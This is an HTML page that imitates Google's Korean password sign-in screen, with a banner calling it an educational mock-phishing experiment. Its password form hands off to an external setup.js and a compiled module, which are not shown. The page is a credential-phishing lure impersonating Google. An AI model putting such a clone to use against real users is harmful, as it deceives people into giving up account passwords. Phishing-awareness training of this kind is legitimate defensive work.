<!doctype html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>로그인 - Google 계정</title>
  <style>
    body {
      margin: 0;
      background-color: #f7fafe;
      font-family: system-ui, sans-serif;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
      justify-content: center;
      align-items: center;
      font-size: 19px;
    }

    .container {
      width: 100%;
      max-width: 1000px;
      padding: 0 16px;
      box-sizing: border-box;
    }

    .card {
      background: white;
      border-radius: 1rem;
      display: flex;
      width: 100%;
      padding: 3rem 2rem 2.5rem;
      border: 1px solid #e5e7eb;
      box-sizing: border-box;
    }

    .left {
      flex: 1;
      padding-right: 1rem;
    }

    .logo {
      height: 48px;
      width: 48px;
      object-fit: contain;
    }

    .title {
      font-size: 2rem;
      font-weight: 400;
      word-break: break-word;
      margin-bottom: 1rem;
    }

    .email-box {
      display: flex;
      align-items: center;
      gap: 8px;
      border: 1px solid #9ca3af;
      border-radius: 9999px;
      padding: 0.4rem 1rem;
      font-size: 0.95rem;
      cursor: pointer;
      width: fit-content;
    }

    .email-icon {
      height: 20px;
      width: 20px;
      border-radius: 50%;
      object-fit: cover;
    }

    .email-text {
      font-weight: 500;
      color: #111827;
    }

    .email-arrow {
      margin-left: auto;
      font-size: 0.75rem;
      color: #374151;
    }

    .right {
      flex: 1;
      padding-left: 1rem;
      display: flex;
      flex-direction: column;
      padding-top: 3rem;
    }

    .form {
      display: flex;
      flex-direction: column;
    }

    .input {
      border: 1px solid #9ca3af;
      border-radius: 0.5rem;
      padding: 1rem;
      font-size: 1.125rem;
      font-weight: 500;
      margin-bottom: 0.75rem;
      margin-top: 3.5rem;
      width: 100%;
      box-sizing: border-box;
    }

    .checkbox-label {
      margin-bottom: 30px;
      font-size: 14px;
      font-weight: 600;
      color: #374151;
    }

    .checkbox-label input {
      margin-right: 6px;
    }

    .buttons {
      display: flex;
      justify-content: flex-end;
      align-items: center;
      gap: 30px;
      margin-top: 1.5rem;
    }

    .find-password {
      color: #1a73e8;
      font-size: 1rem;
      font-weight: 700;
      text-decoration: none;
    }

    .find-password:hover {
      text-decoration: underline;
    }

    .next-btn {
      background: #1a73e8;
      color: white;
      border: none;
      padding: 0.5rem 1.5rem;
      border-radius: 9999px;
      font-size: 1rem;
      cursor: pointer;
    }

    .next-btn:hover {
      background: #1669c1;
    }

    .footer {
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 0.75rem;
      font-weight: 700;
      color: #6b7280;
      width: 100%;
      max-width: 1200px;
      margin-top: 0.5rem;
      padding: 0 2rem;
      box-sizing: border-box;
    }

    .lang-select {
      display: flex;
      align-items: center;
      gap: 0.5rem;
      position: relative;
    }

    .lang-select select {
      background: transparent;
      border: none;
      cursor: pointer;
      font-size: 0.75rem;
      appearance: none;
      padding-right: 7rem;
      color: #6b7280;
    }

    .select-arrow {
      font-size: 0.75rem;
      pointer-events: none;
      color: #6b7280;
    }

    .footer-links {
      display: flex;
      gap: 1.5rem;
    }

    .footer-links a {
      color: #6b7280;
      text-decoration: none;
    }

    .footer-links a:hover {
      text-decoration: underline;
    }

    .warning-banner {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      background: #ffebee;
      color: #b71c1c;
      font-weight: bold;
      text-align: center;
      padding: 10px;
      z-index: 9999;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    }
  </style>
</head>
<body>

  <div class="warning-banner">
    ⚠ 이 페이지는 교육용 모의 피싱 실험입니다. 실제 개인정보를 입력하지 마세요.
  </div>
  
  <div class="container">
    <div class="card">
      <div class="left">
        <img src="./img/glogo.png" alt="Logo" class="logo">
        <h1 class="title">시작하기</h1>
        <div class="email-box" onclick="location.href='index.html'">
          <img src="./img/login_icon.png" alt="Icon" class="email-icon">
          <span class="email-text" id="email-display">example@gmail.com</span>
          <span class="email-arrow">▼</span>
        </div>
        <div style="height: 3rem;"></div>
      </div>

      <div class="right">
        <form class="form" id="password-form">
          <input type="password" id="password" class="input" placeholder="비밀번호 입력">
          <label class="checkbox-label">
            <input type="checkbox" onclick="togglePassword()"> 비밀번호 표시
          </label>

          <div class="buttons">
            <a href="https://accounts.google.com/signin/v2/recoveryidentifier" class="find-password">비밀번호 찾기</a>
            <button type="submit" class="next-btn">다음</button>
          </div>
        </form>
      </div>
    </div>

    <footer class="footer">
      <div class="lang-select">
        <select>
          <option selected>한국어</option>
        </select>
        <span class="select-arrow">▼</span>
      </div>
      <div class="footer-links">
        <a href="https://support.google.com/accounts?hl=ko">도움말</a>
        <a href="https://policies.google.com/privacy?hl=ko">개인정보처리방침</a>
        <a href="https://policies.google.com/terms?hl=ko">약관</a>
      </div>
    </footer>
  </div>

  <script src="setup.js"></script>
  <script>
    document.getElementById('email-display').innerText = localStorage.getItem('user_email') || 'example@gmail.com';

    function togglePassword() {
      var pw = document.getElementById("password");
      pw.type = (pw.type === "password") ? "text" : "password";
    }

    createModule().then((Module) => {
      Module._setup();
    });
  </script>
</body>
</html>
